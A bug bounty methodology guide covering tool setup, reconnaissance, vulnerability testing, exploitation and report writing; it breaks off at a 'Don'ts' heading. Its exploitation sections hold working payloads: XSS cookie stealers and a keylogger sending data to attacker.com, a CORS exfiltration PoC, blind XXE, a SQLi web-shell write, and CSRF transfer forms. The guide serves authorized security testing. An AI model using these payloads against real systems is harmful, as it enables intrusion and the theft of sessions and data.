# 🎯 MÉTHODOLOGIE COMPLÈTE DE BUG BOUNTY

## Phase 0: Préparation & Setup

### 🔧 Environment Setup

#### VPS/Cloud Setup (Recommandé)
```bash
# DigitalOcean, AWS, Azure, ou Linode
# Specs recommandées: 8GB RAM, 4 CPU cores, 100GB SSD

# Update system
sudo apt update && sudo apt upgrade -y

# Install essentials
sudo apt install -y git curl wget python3 python3-pip golang-go ruby nmap
```

#### Tools Installation Script
```bash
#!/bin/bash
# save as setup.sh

echo "[+] Installing Go tools..."
export GO111MODULE=on
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/notify/cmd/notify@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/httprobe@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/gf@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/ffuf/ffuf@latest
go install -v github.com/hahwul/dalfox/v2@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/hakluke/hakrawler@latest
go install -v github.com/jaeles-project/gospider@latest

echo "[+] Installing Python tools..."
pip3 install uro trufflehog arjun dnsgen

echo "[+] Cloning important repos..."
cd ~/tools
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
git clone https://github.com/tomnomnom/gf.git && cd gf && cp gf-completion.bash ~/.gf-completion.bash

echo "[+] Setup complete!"
```

#### Burp Suite Configuration
```
1. Install Burp Suite Professional (or Community)
2. Essential Extensions:
   - Autorize (IDOR testing)
   - Turbo Intruder (Race conditions)
   - JWT Editor
   - ActiveScan++
   - Param Miner
   - IP Rotate
   - InQL (GraphQL)
   - Upload Scanner
   - Collaborator Everywhere
```

#### Browser Setup
```
Firefox/Chrome with extensions:
- FoxyProxy (Proxy switching)
- Wappalyzer (Tech detection)
- Cookie-Editor
- HackTools
- User-Agent Switcher
```

---

## Phase 1: Reconnaissance Passive (OSINT)

### 🔍 1.1 Subdomain Enumeration (Passive)

#### Tool: Subfinder
```bash
# Basic usage
subfinder -d target.com -o subdomains.txt

# Advanced with sources
subfinder -d target.com -all -recursive -o subdomains.txt

# Config file: ~/.config/subfinder/provider-config.yaml
# Add API keys for better results
```

**API Keys à configurer:**
- Shodan
- Censys
- VirusTotal
- GitHub
- SecurityTrails
- Chaos (ProjectDiscovery)

#### Tool: Assetfinder
```bash
# Find related domains and subdomains
assetfinder --subs-only target.com | tee -a subdomains.txt
```

#### Tool: Amass
```bash
# Most comprehensive (slower)
amass enum -d target.com -config config.ini -o amass_results.txt

# Passive only
amass enum -passive -d target.com -o amass_passive.txt

# Config file example (~/.config/amass/config.ini):
[data_sources.Shodan]
[data_sources.Shodan.Credentials]
apikey = YOUR_API_KEY
```

#### Tool: Chaos
```bash
# ProjectDiscovery's dataset
chaos -d target.com -o chaos_results.txt
```

#### Certificate Transparency Logs
```bash
# crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Tool: certspotter
go install github.com/SSLMate/certspotter/cmd/certspotter@latest
certspotter -domain target.com
```

### 🌐 1.2 Acquisitions & Related Companies

#### Tool: Crunchbase
```bash
# Manual research on crunchbase.com
# Look for:
- Acquisitions
- Subsidiaries
- Parent companies
- Related organizations
```

#### Tool: BGP Data
```bash
# Hurricane Electric BGP Toolkit
# https://bgp.he.net/
# Search for ASN numbers

# Tool: ASNLookup
go install github.com/yassineaboukir/asnlookup@latest
asnlookup -o target.com
```

### 📱 1.3 Mobile Applications

#### APK Analysis
```bash
# Download APKs
# apkpure.com, apkmirror.com

# Tool: MobSF
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Tool: apktool
apktool d app.apk -o output_folder

# Extract endpoints and secrets
grep -r "http" output_folder/
grep -r "api" output_folder/
grep -r "key" output_folder/
```

### 🔎 1.4 Google Dorking

#### Essential Dorks
```bash
# Subdomains
site:target.com -www

# Login pages
site:target.com inurl:login
site:target.com inurl:admin
site:target.com inurl:dashboard

# Exposed files
site:target.com ext:php
site:target.com ext:asp
site:target.com ext:jsp
site:target.com filetype:pdf
site:target.com filetype:xlsx

# Sensitive info
site:target.com intext:"password"
site:target.com intext:"api key"
site:target.com intext:"secret"

# Errors & Debug
site:target.com intext:"error"
site:target.com intext:"warning"
site:target.com inurl:phpinfo.php

# AWS S3 buckets
site:s3.amazonaws.com "target.com"
site:amazonaws.com inurl:target

# GitHub
site:github.com "target.com"
site:github.com "target.com" password
site:github.com "target.com" api_key
```

#### Tool: DorkScanner
```bash
git clone https://github.com/madhavmehndiratta/dorkscanner
python3 dorkscanner.py -d target.com
```

### 📂 1.5 Wayback Machine & Archive

#### Tool: Waybackurls
```bash
# Get historical URLs
waybackurls target.com | tee wayback.txt

# Filter interesting files
waybackurls target.com | grep -E "\.js$|\.json$|\.xml$|\.conf$|\.config$"

# Find parameters
waybackurls target.com | grep "=" | tee parameters.txt
```

#### Tool: Gau (GetAllUrls)
```bash
# Aggregate from multiple sources
gau target.com | tee gau_results.txt

# Filter by extension
gau target.com | grep -E "\.js$"

# Combine with other tools
gau target.com | uro | httpx -mc 200
```

### 🔐 1.6 Credential Leaks

#### Tool: TruffleHog
```bash
# Scan GitHub org
trufflehog github --org=target-org

# Scan specific repo
trufflehog git https://github.com/target/repo --only-verified

# Scan filesystem
trufflehog filesystem /path/to/scan
```

#### Tool: GitLeaks
```bash
# Scan repo
gitleaks detect --source . -v

# Scan remote
gitleaks detect --repo https://github.com/target/repo
```

#### GitHub Monitoring
```bash
# Tool: GitDorker
git clone https://github.com/obheda12/GitDorker
python3 GitDorker.py -tf tokens.txt -q target.com -d dorks.txt

# Manual GitHub search
# github.com/search?q=target.com+password
# github.com/search?q=target.com+api_key
# github.com/search?q=target.com+secret
```

#### Pastebin & Similar
```bash
# psbdmp.ws
curl -s "https://psbdmp.ws/api/search/target.com"

# pastebeen.com
# Manual search
```

### 🗄️ 1.7 Shodan & Censys

#### Shodan
```bash
# Install CLI
pip install shodan

# Search
shodan search "hostname:target.com"
shodan search "ssl:target.com"

# Get host info
shodan host 1.2.3.4

# Useful filters:
# hostname:target.com
# ssl:"target.com"
# http.title:"target"
# port:8080
```

#### Censys
```bash
# Install
pip install censys

# Search
censys search "services.http.response.headers: target.com"

# Certificate search
censys search "parsed.subject.common_name: target.com"
```

### 📊 1.8 Social Media & Employee OSINT

#### LinkedIn
```
- Find employees
- Identify tech stack (from job postings)
- Find email patterns
- Discover technologies used
```

#### Tool: theHarvester
```bash
theHarvester -d target.com -b all

# Sources: google, bing, linkedin, twitter, etc.
```

#### Email Pattern Discovery
```bash
# Tool: hunter.io
# Manual: Check LinkedIn, company website

# Common patterns:
# firstname.lastname@target.com
# firstname@target.com
# f.lastname@target.com
```

---

## Phase 2: Reconnaissance Active

### 🎯 2.1 Subdomain Validation & Probing

#### DNS Resolution
```bash
# Tool: dnsx
cat subdomains.txt | dnsx -o resolved.txt

# With details
cat subdomains.txt | dnsx -resp -o dns_details.txt

# Check for wildcard
dnsx -d target.com -w wordlist.txt
```

#### HTTP Probing
```bash
# Tool: httpx
cat resolved.txt | httpx -o live_hosts.txt

# Advanced probing
cat resolved.txt | httpx -title -tech-detect -status-code -cdn -o httpx_results.txt

# Full probe
cat resolved.txt | httpx \
  -title \
  -tech-detect \
  -status-code \
  -content-length \
  -web-server \
  -cdn \
  -ip \
  -cname \
  -location \
  -o full_probe.txt
```

### 🔍 2.2 Port Scanning

#### Tool: Naabu
```bash
# Fast scan top ports
naabu -host target.com -top-ports 1000

# Full port scan
naabu -host target.com -p - -o all_ports.txt

# Multiple hosts
cat resolved.txt | naabu -top-ports 1000 -o ports.txt

# Exclude certain ports
naabu -host target.com -exclude-ports 80,443
```

#### Tool: Nmap (Detailed)
```bash
# Service detection
nmap -sV -p- target.com -oA nmap_service

# Aggressive scan
nmap -A -p- target.com -oA nmap_aggressive

# Script scanning
nmap --script=default,vuln -p- target.com

# Multiple hosts
nmap -sV -iL hosts.txt -oA nmap_results
```

### 🕷️ 2.3 Web Crawling

#### Tool: Katana
```bash
# Basic crawl
katana -u https://target.com -o crawl.txt

# Deep crawl with JS parsing
katana -u https://target.com -jc -d 5 -o deep_crawl.txt

# Multiple URLs
cat live_hosts.txt | katana -jc -o katana_results.txt

# Extract specific patterns
katana -u https://target.com | grep -E "\.js$|api"
```

#### Tool: Hakrawler
```bash
# Crawl and parse JS
echo https://target.com | hakrawler -d 3 -o hakrawler.txt

# Include subdomains
echo https://target.com | hakrawler -subs -o crawl_subs.txt
```

#### Tool: GoSpider
```bash
# Fast crawling
gospider -s https://target.com -o output -c 10 -d 3

# Multiple sites
gospider -S sites.txt -o output -c 20 -d 5
```

### 📜 2.4 JavaScript Analysis

#### Extract JS Files
```bash
# From httpx results
cat httpx_results.txt | grep "\.js$" > js_files.txt

# From crawling
cat katana_results.txt | grep "\.js$" | sort -u > js_files.txt
```

#### Tool: LinkFinder
```bash
# Extract endpoints from JS
python linkfinder.py -i https://target.com/app.js -o results.html

# Batch processing
cat js_files.txt | while read url; do
  python linkfinder.py -i "$url" -o cli
done
```

#### Tool: SecretFinder
```bash
# Find secrets in JS
python SecretFinder.py -i https://target.com -o cli

# Batch
cat js_files.txt | while read url; do
  python SecretFinder.py -i "$url" -o cli
done
```

#### Tool: JSScanner
```bash
git clone https://github.com/dark-warlord14/JSScanner
python3 jss.py -u https://target.com
```

### 🔗 2.5 Parameter Discovery

#### From URLs
```bash
# Extract parameters
cat crawl.txt | grep "=" | uro > parameters.txt

# Unique parameters
cat parameters.txt | cut -d= -f1 | sort -u > param_names.txt
```

#### Tool: Arjun
```bash
# Discover hidden parameters
arjun -u https://target.com/endpoint

# POST request
arjun -u https://target.com/api -m POST

# Custom wordlist
arjun -u https://target.com -w custom_params.txt

# Multiple URLs
cat urls.txt | arjun
```

#### Tool: ParamSpider
```bash
python3 paramspider.py -d target.com -o params.txt
```

---

## Phase 3: Énumération & Mapping

### 🗺️ 3.1 Directory & File Enumeration

#### Tool: FFuF
```bash
# Basic fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt

# With extensions
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.js,.json,.xml

# Virtual host fuzzing
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt

# POST data fuzzing
ffuf -u https://target.com/api -X POST -d "param=FUZZ" -w values.txt

# Filter by status code
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# Filter by size
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 4242

# Rate limiting
ffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100
```

#### Tool: Feroxbuster
```bash
# Recursive scan
feroxbuster -u https://target.com -w wordlist.txt

# With extensions
feroxbuster -u https://target.com -w wordlist.txt -x php,html,js

# Deep scan
feroxbuster -u https://target.com -w wordlist.txt -d 5 -t 50

# Scan multiple targets
feroxbuster -u https://target.com -w wordlist.txt --parallel 3
```

#### Tool: Gobuster
```bash
# Directory busting
gobuster dir -u https://target.com -w wordlist.txt

# DNS brute force
gobuster dns -d target.com -w subdomains.txt

# Vhost discovery
gobuster vhost -u https://target.com -w vhosts.txt
```

### 🎯 3.2 API Enumeration

#### Tool: Kiterunner
```bash
# Scan for API endpoints
kr scan https://target.com -w routes-large.kite

# Wordlist scan
kr wordlist scan https://target.com/api -w api_wordlist.txt

# Brute force
kr brute https://target.com/api/v1 -w numbers.txt
```

#### REST API Discovery
```bash
# Common patterns
/api/v1/users
/api/v2/users
/api/users
/v1/users
/users

# Fuzzing
ffuf -u https://target.com/api/FUZZ -w api_endpoints.txt
```

#### GraphQL Discovery
```bash
# Common endpoints
/graphql
/graphiql
/api/graphql
/v1/graphql

# Tool: GraphQL Cop
python3 graphql-cop.py -t https://target.com/graphql

# Introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### 🔐 3.3 Authentication Endpoints

#### Common Auth Endpoints
```bash
/login
/signin
/api/login
/api/auth
/api/v1/auth
/oauth/token
/auth/login
/user/login
/admin/login
/api/signin
/api/authenticate
/authentication
```

#### Fuzzing Auth
```bash
ffuf -u https://target.com/FUZZ -w auth_endpoints.txt -mc 200,301,302
```

### 🗃️ 3.4 Cloud Storage Enumeration

#### S3 Buckets
```bash
# Common patterns
target-uploads
target-backup
target-data
target-images
target-files
target-prod
target-dev

# Tool: S3Scanner
python s3scanner.py --bucket-file buckets.txt

# Manual check
aws s3 ls s3://bucket-name --no-sign-request
```

#### Azure Blobs
```bash
# Pattern
https://accountname.blob.core.windows.net/container

# Tool: AzureHound
azurehound --tenant tenant-id
```

#### Google Cloud Storage
```bash
# Pattern
https://storage.googleapis.com/bucket-name

# Check public access
curl https://storage.googleapis.com/bucket-name/
```

---

## Phase 4: Vulnerability Assessment

### 🔍 4.1 Automated Vulnerability Scanning

#### Tool: Nuclei
```bash
# Basic scan
nuclei -u https://target.com

# Multiple targets
cat live_hosts.txt | nuclei

# Specific templates
nuclei -u https://target.com -t cves/ -t vulnerabilities/

# All templates
nuclei -u https://target.com -t ~/nuclei-templates/

# Severity filter
nuclei -u https://target.com -severity critical,high

# Output
nuclei -l targets.txt -o nuclei_results.txt

# Update templates
nuclei -update-templates

# Custom template
nuclei -u https://target.com -t custom-template.yaml
```

**Key Nuclei Templates:**
- `cves/` - CVE checks
- `vulnerabilities/` - Known vulnerabilities
- `exposures/` - Information disclosure
- `misconfiguration/` - Config issues
- `default-logins/` - Default credentials
- `takeovers/` - Subdomain takeovers

#### Tool: Nikto
```bash
# Web server scan
nikto -h https://target.com

# Save output
nikto -h https://target.com -o nikto_results.txt
```

### 🎯 4.2 IDOR Testing (PRIORITÉ!)

#### Manual IDOR Testing
```
1. Create two test accounts (Account A & B)
2. Identify endpoints with IDs:
   - /api/user/123
   - /api/order/456
   - /api/document/789
   
3. Test patterns:
   - Sequential IDs (1,2,3...)
   - UUIDs
   - Encoded IDs (base64, hex)
   
4. Try operations:
   - GET (read other's data)
   - PUT/PATCH (modify other's data)
   - DELETE (delete other's data)
   - POST (create as another user)
```

#### Burp Suite - Autorize Extension
```
1. Install Autorize extension
2. Configure low-privilege user session
3. Browse as high-privilege user
4. Autorize automatically tests access
5. Review findings
```

#### Test Cases
```bash
# Numeric IDs
/api/user/1
/api/user/2
/api/user/999999

# UUID manipulation
/api/user/550e8400-e29b-41d4-a716-446655440000

# Encoded IDs
echo "123" | base64  # MTIzCg==
/api/user/MTIzCg==

# Object references
/api/document?user_id=123
/api/profile?username=victim
```

### 🔓 4.3 Authentication Testing

#### JWT Testing
```bash
# Tool: jwt_tool
jwt_tool <token>

# Test algorithms
jwt_tool <token> -T

# Crack secret
jwt_tool <token> -C -d wordlist.txt

# Modify claims
jwt_tool <token> -I -pc name -pv "admin"

# None algorithm attack
jwt_tool <token> -X a
```

#### Session Testing
```
Test points:
- Session fixation
- Session timeout
- Logout functionality
- Concurrent sessions
- Session token predictability
- Cookie flags (HttpOnly, Secure, SameSite)
```

#### OAuth Testing
```
Test points:
- Open redirect in redirect_uri
- CSRF in OAuth flow
- Token leakage
- Scope manipulation
- State parameter bypass
```

### ⚡ 4.4 XSS Testing

#### Tool: Dalfox
```bash
# Basic scan
dalfox url https://target.com/page?q=test

# Deep scan
dalfox url https://target.com/page?q=test -b https://your-xss-hunter.com

# Multiple URLs
cat urls.txt | dalfox pipe

# Custom payload
dalfox url https://target.com?q=FUZZ -p payloads.txt

# Blind XSS
dalfox url https://target.com/contact -b https://xss.ht/your-id
```

#### Tool: XSStrike
```bash
# Automated XSS
python xsstrike.py -u "https://target.com/page?q=test"

# Crawl and test
python xsstrike.py -u "https://target.com" --crawl
```

#### Manual XSS Testing
```javascript
// Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Bypass filters
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert`1`>

// DOM XSS
javascript:alert(1)
<iframe src="javascript:alert(1)">

// Stored XSS test
"><script>fetch('https://your-server.com?c='+document.cookie)</script>
```

#### Blind XSS Hunter
```
Use services:
- XSS Hunter (xss.ht)
- Burp Collaborator
- Custom server

Test in:
- Contact forms
- User profiles
- Comments
- Support tickets
- Log viewers
- Admin panels
```

### 🗄️ 4.5 SQL Injection Testing

#### Tool: SQLMap
```bash
# Basic test
sqlmap -u "https://target.com/page?id=1"

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# From Burp request
sqlmap -r request.txt

# Database enumeration
sqlmap -u "https://target.com/page?id=1" --dbs

# Table enumeration
sqlmap -u "https://target.com/page?id=1" -D database_name --tables

# Dump data
sqlmap -u "https://target.com/page?id=1" -D db_name -T table_name --dump

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Tamper scripts
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
```

#### Manual SQLi Testing
```sql
-- Basic tests
'
''
`
``
,
"
""
/
//
\
\\
;
' OR '1
' OR 1 -- -
" OR 1 = 1 -- -
' OR 'a'='a
') OR ('a'='a

-- Time-based
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
'+(SELECT*FROM(SELECT(SLEEP(5)))a)+'

-- Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Error-based
' AND 1=CONVERT(int, (SELECT @@version))--
```

### 🔒 4.6 SSRF Testing

#### Test Payloads
```bash
# Internal IPs
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://[::]:80/
http://0177.0.0.1/ (Octal)
http://2130706433/ (Decimal)
http://017700000001 (Octal)

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/

# Private networks
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1

# DNS rebinding
http://spoofed.burpcollaborator.net

# Bypasses
http://127.1
http://127.0.1
http://127.00.00.01
http://①②⑦.⓪.⓪.⓪
```

#### Tool: SSRFmap
```bash
python3 ssrfmap.py -r request.txt -p url

# AWS metadata
python3 ssrfmap.py -r request.txt -m aws
```

### 🚪 4.7 Open Redirect Testing

#### Test Payloads
```bash
# Basic
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?return=https://evil.com
?continue=https://evil.com

# Bypasses
?url=//evil.com
?url=///evil.com
?url=////evil.com
?url=https://evil.com.target.com
?url=target.com.evil.com
?url=target.com@evil.com
?url=target.com%2F@evil.com
?url=https://target.com%252F@evil.com
```

### 📤 4.8 File Upload Testing

#### Test Cases
```
1. File extension bypass:
   - file.php
   - file.php.jpg
   - file.php%00.jpg
   - file.php%0a.jpg
   - file.PhP
   - file.pHp

2. MIME type bypass:
   - Change Content-Type to image/jpeg
   
3. Magic bytes:
   - Add GIF89a to start of PHP file
   
4. Polyglot files:
   - Valid image + PHP code
   
5. Path traversal:
   - ../../upload/shell.php
   
6. XXE in SVG:
   <?xml version="1.0"?>
   <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <svg>&xxe;</svg>
```

### 🔐 4.9 CSRF Testing

#### Test Process
```
1. Identify state-changing requests
2. Remove CSRF token
3. Test if request still works
4. Generate PoC

PoC Template:
<html>
  <body>
    <form action="https://target.com/api/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="submit" value="Submit" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### ⚡ 4.10 Race Condition Testing

#### Burp Turbo Intruder
```python
# race-condition.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=50,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

#### Common Race Conditions
```
- Coupon/promo code reuse
- Parallel payment processing
- Simultaneous resource creation
- Double voting/like
- Parallel account creation
```

### 🌐 4.11 CORS Misconfiguration Testing

#### Test Cases
```bash
# Check CORS headers
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: X-Requested-With" \
  -X OPTIONS --verbose \
  https://target.com/api/endpoint

# Look for:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Null origin bypass
curl -H "Origin: null" https://target.com/api
```

#### Exploitation PoC
```html
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET','https://target.com/api/sensitive',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.com/log?data='+this.responseText;
};
</script>
</body>
</html>
```

### 🔓 4.12 XXE (XML External Entity) Testing

#### Test Payloads
```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root></root>

<!-- Error-based XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>

<!-- SOAP XXE -->
<soap:Body>
  <foo>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <bar>&xxe;</bar>
  </foo>
</soap:Body>
```

### 🗝️ 4.13 Broken Access Control

#### Horizontal Privilege Escalation
```
Test Cases:
1. Access other user's resources by changing ID
   GET /api/user/123/profile → /api/user/456/profile
   
2. Modify requests to include other user's ID
   POST /api/order
   {"user_id": 456, "item": "xyz"}
   
3. Parameter manipulation
   GET /profile?user=victim
```

#### Vertical Privilege Escalation
```
Test Cases:
1. Access admin endpoints as regular user
   GET /admin/users
   
2. Add admin role in requests
   POST /api/update-profile
   {"username": "test", "role": "admin"}
   
3. HTTP method manipulation
   GET /admin/delete-user → DELETE /admin/delete-user
   
4. URL manipulation
   /user/settings → /admin/settings
```

### 🔍 4.14 Business Logic Flaws

#### Price Manipulation
```
Test Cases:
- Negative quantities: {"quantity": -1}
- Zero price: {"price": 0}
- Currency manipulation
- Coupon stacking
- Refund abuse
```

#### Workflow Bypass
```
Test Cases:
- Skip payment steps
- Access resources without prerequisites
- Replay old transactions
- Manipulate state parameters
```

### 📱 4.15 API Security Testing

#### REST API Tests
```bash
# HTTP methods
curl -X GET https://target.com/api/users
curl -X POST https://target.com/api/users -d '{"name":"test"}'
curl -X PUT https://target.com/api/users/1 -d '{"name":"modified"}'
curl -X DELETE https://target.com/api/users/1
curl -X PATCH https://target.com/api/users/1 -d '{"email":"new@email.com"}'

# Mass assignment
curl -X POST https://target.com/api/users -d '{"name":"test","role":"admin","is_verified":true}'

# Parameter pollution
curl "https://target.com/api/users?id=1&id=2"

# Rate limiting
for i in {1..1000}; do curl https://target.com/api/endpoint; done
```

#### GraphQL Security
```graphql
# Introspection
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Batching attack
[
  {"query": "query { user(id: 1) { name } }"},
  {"query": "query { user(id: 2) { name } }"},
  # ... repeat 1000 times
]

# Nested queries (DoS)
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              # ... deeply nested
            }
          }
        }
      }
    }
  }
}

# IDOR in GraphQL
query {
  user(id: "victim-id") {
    email
    privateData
  }
}
```

### 🔐 4.16 Authentication Bypass Techniques

#### Common Bypasses
```bash
# SQL injection in login
username: admin' OR '1'='1
password: anything

# NoSQL injection
username: {"$ne": null}
password: {"$ne": null}

# JWT manipulation
# Change algorithm to "none"
# Modify user claims

# Cookie manipulation
admin=false → admin=true
role=user → role=admin

# Password reset token manipulation
# Brute force reset tokens
# Token reuse
# Token leakage in Referer

# 2FA bypass
# Race condition in verification
# Missing validation on critical endpoints
# Response manipulation
```

---

## Phase 5: Exploitation & PoC Development

### 💥 5.1 Exploit Development

#### XSS Exploitation
```javascript
// Cookie stealer
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
});
</script>

// BeEF hook
<script src="http://attacker.com:3000/hook.js"></script>

// Session hijacking
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/steal', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  cookies: document.cookie,
  localStorage: localStorage,
  sessionStorage: sessionStorage
}));
</script>
```

#### CSRF Exploitation
```html
<!-- Auto-submit form -->
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
</body>
</html>

<!-- AJAX CSRF -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({email: 'attacker@evil.com'}));
</script>
```

#### SSRF Exploitation
```python
# Port scanner via SSRF
import requests

for port in range(1, 1000):
    url = f"http://target.com/fetch?url=http://127.0.0.1:{port}"
    try:
        r = requests.get(url, timeout=5)
        if "Connection refused" not in r.text:
            print(f"Port {port} is open")
    except:
        pass

# AWS metadata extraction
url = "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

#### SQLi Exploitation
```sql
-- Extract database names
' UNION SELECT schema_name FROM information_schema.schemata--

-- Extract table names
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'--

-- Extract column names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password FROM users--

-- File read
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- File write
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
```

### 📝 5.2 PoC Creation

#### Video Recording Tools
```bash
# Screen recording
- OBS Studio
- Kazam (Linux)
- QuickTime (Mac)
- ScreenToGif (Windows)

# Convert to GIF
ffmpeg -i video.mp4 -vf "fps=10,scale=720:-1" output.gif
```

#### HTTP Request/Response Documentation
```bash
# Save from Burp Suite
1. Right-click request → Copy as curl command
2. Right-click request → Save item

# Format for report
curl 'https://target.com/api/endpoint' \
  -H 'Authorization: Bearer TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"user_id": "victim"}'

Response:
{
  "status": "success",
  "data": {
    "email": "victim@email.com",
    "private_info": "sensitive_data"
  }
}
```

#### Screenshot Tools
```bash
# Annotated screenshots
- Flameshot (Linux)
- Greenshot (Windows)
- Skitch (Mac)

# Full page screenshots
- GoFullPage (Browser extension)
- Firefox built-in (Shift+F2, screenshot --fullpage)
```

---

## Phase 6: Reporting

### 📋 6.1 Report Structure

#### Essential Components
```markdown
# [Severity] Vulnerability Title

## Summary
Brief description of the vulnerability in 2-3 sentences.

## Vulnerability Details
**Vulnerability Type:** IDOR / XSS / SQLi / etc.
**Severity:** Critical / High / Medium / Low
**Target:** https://target.com/vulnerable/endpoint
**Vulnerable Parameter:** user_id

## Steps to Reproduce
1. Create two test accounts (Account A & B)
2. Login as Account A
3. Capture the request to /api/user/profile
4. Change user_id parameter from A's ID to B's ID
5. Observe that Account B's private data is returned

## Proof of Concept

### Request
```
GET /api/user/123/profile HTTP/1.1
Host: target.com
Authorization: Bearer [Account A's token]
```

### Response
```
HTTP/1.1 200 OK
{
  "user_id": 123,
  "email": "victim@email.com",
  "ssn": "XXX-XX-XXXX",
  "credit_card": "****1234"
}
```

### Video/Screenshots
[Attached: poc_video.mp4]
[Attached: screenshot1.png]

## Impact
An authenticated attacker can access any user's private information including:
- Email addresses
- Social Security Numbers
- Credit card information
- Private messages
- Personal documents

This affects all X million users of the platform.

## Remediation
1. Implement proper authorization checks
2. Validate that the requesting user owns the resource
3. Use non-sequential, unpredictable IDs (UUIDs)

Example fix:
```python
def get_user_profile(user_id):
    if current_user.id != user_id:
        return {"error": "Unauthorized"}, 403
    return get_profile(user_id)
```

## References
- https://owasp.org/www-project-web-security-testing-guide/
- https://cwe.mitre.org/data/definitions/639.html
```

### 🎯 6.2 Severity Assessment

#### CVSS Calculator
```
Use: https://www.first.org/cvss/calculator/3.1

Factors:
- Attack Vector (Network/Adjacent/Local/Physical)
- Attack Complexity (Low/High)
- Privileges Required (None/Low/High)
- User Interaction (None/Required)
- Scope (Unchanged/Changed)
- Confidentiality Impact (None/Low/High)
- Integrity Impact (None/Low/High)
- Availability Impact (None/Low/High)
```

#### Bugcrowd VRT (Vulnerability Rating Taxonomy)
```
P1 (Critical): Remote code execution, SQL injection leading to data breach
P2 (High): IDOR accessing sensitive data, Stored XSS, Authentication bypass
P3 (Medium): Reflected XSS, CSRF on important functions
P4 (Low): Self-XSS, Information disclosure (low impact)
P5 (Informational): Best practice violations
```

### ✍️ 6.3 Writing Tips

#### Do's
```
✅ Be clear and concise
✅ Provide detailed steps
✅ Include PoC with evidence
✅ Explain real-world impact
✅ Suggest remediation
✅ Be professional and respectful
✅ Test thoroughly before submitting
✅ Follow program guidelines
```

#### Don'ts
